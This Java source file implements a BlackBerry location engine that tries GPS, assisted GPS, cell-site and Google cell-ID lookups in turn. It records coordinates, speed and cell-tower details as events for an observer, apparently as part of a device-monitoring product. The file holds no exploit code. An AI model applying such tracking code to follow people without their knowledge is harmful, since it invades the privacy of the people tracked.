package com.vvt.gpsc;

import java.util.Vector;
import javax.microedition.location.*;
import com.vvt.event.FxCellInfoEvent;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxLocationEvent;
import com.vvt.event.constant.FxCallingModule;
import com.vvt.event.constant.FxGPSMethod;
import com.vvt.event.constant.FxGPSProvider;
import com.vvt.gpsc.gloc.GLocRequest;
import com.vvt.gpsc.gloc.GLocResponse;
import com.vvt.gpsc.gloc.GLocationListener;
import com.vvt.gpsc.gloc.GLocationThread;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;

public class GPSEngine implements LocationListener, GLocationListener, FxTimerListener {
	
	private final String TAG = "GPSEngine";
	private final short NOT_DEFINE = -1;
	private boolean isSupportedGPS = false;
	private boolean isEnabled = false;
	private GPSMethod chosenMethod = null;
	private LocationProvider provider = null;
	private QualifiedCoordinates autonomousCoordinates = null;
	private GPSOption gpsOption = null;
	private FxEventListener observer = null;
	private Vector gpsMethodStore = new Vector();
	private FxTimer gLocTimer = new FxTimer(this);
	private FxCallingModule callingModule = FxCallingModule.MODULE_CORE_TRIGGER;
	
	public GPSEngine() {
		isSupportedGPS = hasGPS();
	}
	
	public boolean isSupportedGPS() {
		return isSupportedGPS;
	}
	
	public void setFxEventListener(FxEventListener observer) {
		this.observer = observer;
	}
	
	public GPSOption getGPSOption() {
		return gpsOption;
	}
	
	public void setGPSOption(GPSOption gpsOption) {
		this.gpsOption = gpsOption;
	}
	
	public boolean isEnabled() {
		return isEnabled;
	}
	
	public void setMode(FxCallingModule callingModule)	{
		this.callingModule = callingModule;		
	}
	
//	public void startGPSEngine(FxCallingModule callingModule) {
	public void startGPSEngine() {
//		Log.debug(TAG, "GPSEngine.startGPSEngine()");
		try {
			if (!isEnabled && observer != null 
					&& gpsOption != null 
					&& gpsOption.numberOfGPSMethod() > 0 
					&& gpsOption.getInterval() > 0 
					&& gpsOption.getTimeout() > 0) {
				isEnabled = true;
				chosenMethod = null;
				copyGPSMethod();
				lookupPosition();
			}
		} catch(Exception e) {
			Log.error(TAG, "startGPSEngine(): "+e.getMessage());
			resetGPSCapture();
			observer.onError(e);
		}
	}

	public void stopGPSEngine() {
		try {
			if (isEnabled) {
				isEnabled = false;
				chosenMethod = null;
				gpsMethodStore.removeAllElements();
				resetProvider();
			}
		} catch(Exception e) {
			Log.error(TAG, "stopGPSEngine(): "+e.getMessage());
			resetGPSCapture();
			observer.onError(e);
		}
	}
	
	private void copyGPSMethod() {
		gpsMethodStore.removeAllElements();
		for (int i = 0; i < gpsOption.numberOfGPSMethod(); i++) {
			gpsMethodStore.addElement(gpsOption.getGPSMethod(i));
		}
	}
	
	private boolean hasGPS() {
		boolean isSupported = false;
		try {
			// Autonomous GPS
			Criteria criteria = getCriteria(FxGPSMethod.INTEGRATED_GPS);
			LocationProvider provider = LocationProvider.getInstance(criteria);
			if (provider != null && provider.getState() != LocationProvider.OUT_OF_SERVICE) {
				isSupported = true;
			}
			// Assisted GPS
			if (!isSupported) {
				criteria = getCriteria(FxGPSMethod.AGPS); 
				provider = LocationProvider.getInstance(criteria);
				if (provider != null && provider.getState() != LocationProvider.OUT_OF_SERVICE) {
					isSupported = true;
				}
			}
			// Cellsite GPS
			if (!isSupported) {
				criteria = getCriteria(FxGPSMethod.NETWORK); 
				provider = LocationProvider.getInstance(criteria);
				if (provider != null && provider.getState() != LocationProvider.OUT_OF_SERVICE) {
					isSupported = true;
				}
			}
		} catch(Exception e) {
			Log.error(TAG, "hasGPS()", e);
			resetGPSCapture();
			observer.onError(e);
		}
		return isSupported;
	}
	
	private Criteria getCriteria(FxGPSMethod type) {
		Criteria criteria = null;
		int id = type.getId();
		if (id == FxGPSMethod.UNKNOWN.getId()) {
			criteria = null;
		} else if (id == FxGPSMethod.INTEGRATED_GPS.getId()) {
			criteria = getAutonomousCriteria();
		} else if (id == FxGPSMethod.AGPS.getId()) {
			criteria = getAssistedCriteria();
		} else if (id == FxGPSMethod.NETWORK.getId()) {
			criteria = getCellSiteCriteria();
		}
		return criteria;
	}
	
	private Criteria getCellSiteCriteria() {
		Criteria result = null;
		result = new Criteria();
		result.setHorizontalAccuracy(Criteria.NO_REQUIREMENT);
		result.setVerticalAccuracy(Criteria.NO_REQUIREMENT);
		result.setCostAllowed(true);
		result.setPreferredPowerConsumption(Criteria.POWER_USAGE_LOW);
		return result;
	}
	
	private Criteria getAssistedCriteria() {
		Criteria result = null;
		result = new Criteria();
		result.setHorizontalAccuracy(Criteria.NO_REQUIREMENT);
		result.setVerticalAccuracy(Criteria.NO_REQUIREMENT);
		result.setCostAllowed(true);
		result.setPreferredPowerConsumption(Criteria.POWER_USAGE_MEDIUM);
		return result;
	}
	
	private Criteria getAutonomousCriteria() {
		Criteria result = null;
		result = new Criteria();
		result.setHorizontalAccuracy(Criteria.NO_REQUIREMENT);
		result.setVerticalAccuracy(Criteria.NO_REQUIREMENT);
		result.setCostAllowed(false);
		result.setPreferredPowerConsumption(Criteria.NO_REQUIREMENT);
		return result;
	}
	
	private void lookupPosition() {
		try {
			// To reset the last provider.
			resetProvider();
			// To choose GPS method which is the best priority.
			chosenMethod = chooseGPSMethod();
			// After attempting to lookup GPS by all methods, it will return empty GPSEvent object.
			if (chosenMethod == null) {
				stopGPSEngine();
//				FxGPSEvent defaultGPS = new FxGPSEvent();
				FxLocationEvent defaultLoc = new FxLocationEvent();
				defaultLoc.setEventTime(System.currentTimeMillis());
				observer.onEvent(defaultLoc);
			} else {
				// Searching Location by Google
				if (chosenMethod.getMethod().getId() == FxGPSMethod.CELL_INFO.getId()) {
					if (isSupportedGPS) {
						int timeout = 5;
						gLocTimer.setInterval(timeout);
					} else {
						gLocTimer.setInterval(gpsOption.getInterval());
					}
					gLocTimer.stop();
					gLocTimer.start();
				} else {
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG, "gps options interval:"+gpsOption.getInterval()+
								", timeOut:"+gpsOption.getTimeout());
					}*/
					Criteria criteria = getCriteria(chosenMethod.getMethod());
					provider = LocationProvider.getInstance(criteria);
					provider.setLocationListener(this, gpsOption.getInterval(), gpsOption.getTimeout(), -1);
				}
			}
		} catch(NullPointerException e) { // When using cell site method, it maybe occur "NullPointerException".
			Log.error(TAG, "lookupPosition", e);
			lookupPosition();
		} catch(Exception e) {
			Log.error(TAG, "lookupPosition()", e);
			resetGPSCapture();
			observer.onError(e);
		}
	}

	private void lookupGooglePosition(CDMACellInfo cellInfo) {
		// TODO It is not implemented.
		Log.error("GPSEngine.lookupGooglePosition", "GLocation is not supported on CDMA phone.");
		lookupPosition();
	}
	
	private void lookupGooglePosition(GPRSCellInfo cellInfo) {
		int networkIndex = RadioInfo.getCurrentNetworkIndex();
		int cellId = cellInfo.getCellId();
		if (cellId > 0) {
			int lac = cellInfo.getLAC();
			int mcc = RadioInfo.getMCC(networkIndex);
			int mnc = RadioInfo.getMNC(networkIndex);
			GLocRequest locReq = new GLocRequest();
			locReq.setCellId(cellId);
			locReq.setLac(lac);
			locReq.setMcc(mcc);
			locReq.setMnc(mnc);
			GLocationThread gLoc = new GLocationThread(this, locReq);
			gLoc.start();
		} else {
			Log.error("GPSEngine.lookupGooglePosition", "Cell ID is zero.");
			lookupPosition();
		}
	}
	
	private FxCellInfoEvent getFxCellInfoEvent() {
		FxCellInfoEvent cellEvent = new FxCellInfoEvent();
		if (PhoneInfo.isCDMA() && !PhoneInfo.isHybridPhone()) {
			CDMACellInfo cdmaCellInfo = CDMAInfo.getCellInfo();
			if (cdmaCellInfo != null && cdmaCellInfo.getBID() != 0) {
				int networkIndex = RadioInfo.getCurrentNetworkIndex();
				String networkId = Constant.SPACE + RadioInfo.getNetworkId(networkIndex);
				String networkName = RadioInfo.getCurrentNetworkName();
				int mobileCountryCode =  RadioInfo.getMCC(networkIndex);
				// To set network name.
				cellEvent.setNetworkName(networkName);
				// To set network ID.
				cellEvent.setNetworkId(networkId);
				// To set cell ID.
				cellEvent.setCellId(cdmaCellInfo.getBID());
				// To set country code.
				cellEvent.setMobileCountryCode(mobileCountryCode);
			}
		} else {
			GPRSCellInfo gprsCellInfo = GPRSInfo.getCellInfo();
			if (gprsCellInfo != null && gprsCellInfo.getCellId() != 0) {
				int networkIndex = RadioInfo.getCurrentNetworkIndex();
				String networkId = Constant.SPACE + RadioInfo.getNetworkId(networkIndex);
				String networkName = RadioInfo.getCurrentNetworkName();
				int mobileCountryCode =  RadioInfo.getMCC(networkIndex);
				// To set network name.
				cellEvent.setNetworkName(networkName);
				// To set network ID.
				cellEvent.setNetworkId(networkId);
				// To set cell ID.
				cellEvent.setCellId(gprsCellInfo.getCellId());
				// To set country code.
				cellEvent.setMobileCountryCode(mobileCountryCode);
				// To set area code.
				cellEvent.setAreaCode(gprsCellInfo.getLAC());
			}
		}
		return cellEvent;
	}
	
	private GPSMethod chooseGPSMethod() {
		GPSMethod gpsMethod = null;
		int lastGPSPriority = NOT_DEFINE;
		if (gpsMethodStore.size() > 0) {
			int index = 0;
			if (isRemainOnlyDefaultMethod()) {
				GPSMethod method = (GPSMethod)gpsMethodStore.elementAt(index);
				lastGPSPriority = method.getPriority().getId();
				gpsMethod = method;
			} else {
				for (int i = 0; i < gpsMethodStore.size(); i++) {
					GPSMethod method = (GPSMethod)gpsMethodStore.elementAt(i);
					if (method.getPriority().getId() != GPSPriority.DEFAULT_PRIORITY.getId()) {
						if (lastGPSPriority == NOT_DEFINE || method.getPriority().getId() < lastGPSPriority) {
							lastGPSPriority = method.getPriority().getId();
							gpsMethod = method;
							index = i;
						}
					}
				}
			}
			gpsMethodStore.removeElementAt(index);
		}
		return gpsMethod;
	}

	private boolean isRemainOnlyDefaultMethod() {
		boolean isOnlyDefault = true;
		for (int i = 0; i < gpsMethodStore.size(); i++) {
			GPSMethod method = (GPSMethod)gpsMethodStore.elementAt(i);
			if (method.getPriority().getId() != GPSPriority.DEFAULT_PRIORITY.getId()) {
				isOnlyDefault = false;
				break;
			}
		}
		return isOnlyDefault;
	}

	private void resetProvider() {
		if (provider != null) {
			provider.setLocationListener(null, 0, 0, 0); // When you reset the LocationProvider, GPS will be terminated.
			provider.reset();
		}
	}

	private void resetGPSCapture() {
		isEnabled = false;
		chosenMethod = null;
		if (provider != null) {
			provider.setLocationListener(null, 0, 0, 0); // When you reset the LocationProvider, GPS will be terminated.
			provider.reset();
		}
	}
	
	// LocationListener
	public void locationUpdated(LocationProvider provider, Location loc) {
		try {
			double lat = 0;
			double lng = 0;
			float speed = 0;
			float alt = 0;
			float horAcc = 0;
			float verAcc = 0;
			FxLocationEvent locEvent = new FxLocationEvent();
			if (loc != null) {
				if (loc.isValid()) {
					// This case is for autonomous GPS when it can get the positioning at the first time.
					if (chosenMethod.getMethod().getId() == FxGPSMethod.INTEGRATED_GPS.getId() && autonomousCoordinates == null) {
						autonomousCoordinates = loc.getQualifiedCoordinates();
						Criteria criteria = getCriteria(chosenMethod.getMethod());
						provider = LocationProvider.getInstance(criteria);
						int quickInterval = 10; // In second.
						provider.setLocationListener(this, quickInterval, quickInterval, -1);
					} else {
						autonomousCoordinates = null;
						QualifiedCoordinates coordinates = loc.getQualifiedCoordinates();
						speed = loc.getSpeed();
						lat = coordinates.getLatitude();
						lng = coordinates.getLongitude();
						alt = coordinates.getAltitude();
						horAcc = coordinates.getHorizontalAccuracy();
						verAcc = coordinates.getVerticalAccuracy();
						locEvent.setEventTime(System.currentTimeMillis());
						locEvent.setCallingModule(callingModule);
						locEvent.setMethod(chosenMethod.getMethod().getId());
						locEvent.setProvider(FxGPSProvider.UNKNOWN.getId());
						locEvent.setLongitude(lng);
						locEvent.setLatitude(lat);
						locEvent.setAltitude(alt);
						locEvent.setSpeed(speed);
						locEvent.setHorizontalAccuracy(horAcc);
						locEvent.setVerticalAccuracy(verAcc);
						// Cell info
						FxCellInfoEvent cellInfo = getFxCellInfoEvent();
						locEvent.setNetworkName(cellInfo.getNetworkName());
						locEvent.setNetworkId(cellInfo.getNetworkId());
						locEvent.setCellName(cellInfo.getCellName());
						locEvent.setCellId(cellInfo.getCellId());
//						Log.debug("GPSEngine.locationUpdated()", "MCC(long): " + cellInfo.getMobileCountryCode() + ", MCC(hex): " + Integer.toHexString((int) cellInfo.getMobileCountryCode()));
						locEvent.setMobileCountryCode(Integer.toHexString((int) cellInfo.getMobileCountryCode()));
						locEvent.setAreaCode(cellInfo.getAreaCode());
						stopGPSEngine();
						observer.onEvent(locEvent);
					}
				} else if (autonomousCoordinates != null) {
					// In case of invalid values of autonomous GPS on the second round, it cannot get the location.
					lat = autonomousCoordinates.getLatitude();
					lng = autonomousCoordinates.getLongitude();
					speed = loc.getSpeed();
					alt = autonomousCoordinates.getAltitude();
					horAcc = autonomousCoordinates.getHorizontalAccuracy();
					verAcc = autonomousCoordinates.getVerticalAccuracy();					
					locEvent.setEventTime(System.currentTimeMillis());
					locEvent.setCallingModule(callingModule);
					locEvent.setMethod(FxGPSMethod.INTEGRATED_GPS.getId());
					locEvent.setProvider(FxGPSProvider.UNKNOWN.getId());
					locEvent.setLongitude(lng);
					locEvent.setLatitude(lat);
					locEvent.setAltitude(alt);
					locEvent.setSpeed(speed);
					locEvent.setHorizontalAccuracy(horAcc);
					locEvent.setVerticalAccuracy(verAcc);
					// Cell info
					FxCellInfoEvent cellInfo = getFxCellInfoEvent();
					locEvent.setNetworkName(cellInfo.getNetworkName());
					locEvent.setNetworkId(cellInfo.getNetworkId());
					locEvent.setCellName(cellInfo.getCellName());
					locEvent.setCellId(cellInfo.getCellId());
//					Log.debug("GPSEngine.locationUpdated()", "MCC(long): " + cellInfo.getMobileCountryCode() + ", MCC(hex): " + Integer.toHexString((int) cellInfo.getMobileCountryCode()));
					locEvent.setMobileCountryCode(Integer.toHexString((int) cellInfo.getMobileCountryCode()));
					locEvent.setAreaCode(cellInfo.getAreaCode());
					autonomousCoordinates = null;
					stopGPSEngine();
					observer.onEvent(locEvent);
				} else { // This case happens when GPS timeout occurs.
					lookupPosition();
				}
			}
		} catch(Exception e) {
			Log.error(TAG + ".locationUpdated()", "There is a Exception on the locationUpdated function.", e);
			lookupPosition();
		}
	}

	public void providerStateChanged(LocationProvider provider, int state) {
	}
	
	// GLocationListener
	public void notifyGLocation(GLocResponse resp) {
		if (isEnabled) {
			if (resp != null && resp.getLatitude() != GLocResponse.LOCATION_UNDEFINE && resp.getLongitude() != GLocResponse.LOCATION_UNDEFINE) {
				// After getting GPS values, application will return to listener and finish.
				FxLocationEvent locEvent = new FxLocationEvent();
				locEvent.setEventTime(resp.getTime());
				locEvent.setCallingModule(callingModule);
				locEvent.setMethod(chosenMethod.getMethod().getId());
				locEvent.setProvider(FxGPSProvider.GOOGLE.getId());
				locEvent.setLongitude(resp.getLongitude());
				locEvent.setLatitude(resp.getLatitude());				
				// Cell info
				FxCellInfoEvent cellInfo = getFxCellInfoEvent();
				locEvent.setNetworkName(cellInfo.getNetworkName());
				locEvent.setNetworkId(cellInfo.getNetworkId());
				locEvent.setCellName(cellInfo.getCellName());
				locEvent.setCellId(cellInfo.getCellId());
//				Log.debug("GPSEngine.notifyGLocation()", "MCC(long): " + cellInfo.getMobileCountryCode() + ", MCC(hex): " + Integer.toHexString((int) cellInfo.getMobileCountryCode()));
				locEvent.setMobileCountryCode(Integer.toHexString((int) cellInfo.getMobileCountryCode()));
				locEvent.setAreaCode(cellInfo.getAreaCode());				
				stopGPSEngine();
				observer.onEvent(locEvent);
			} else {
				lookupPosition();
			}
		}
	}
	
	public void notifyError(Exception e) {
		Log.error(TAG, "notifyError(): "+ e.getMessage());
		observer.onError(e);
		if (isEnabled) {
			lookupPosition();
		}
	}

	// FxTimerListener
	public void timerExpired(int id) {
		if (PhoneInfo.isCDMA() && !PhoneInfo.isHybridPhone()) {
			lookupGooglePosition(CDMAInfo.getCellInfo());
		} else {
			lookupGooglePosition(GPRSInfo.getCellInfo());
		}
	}
}
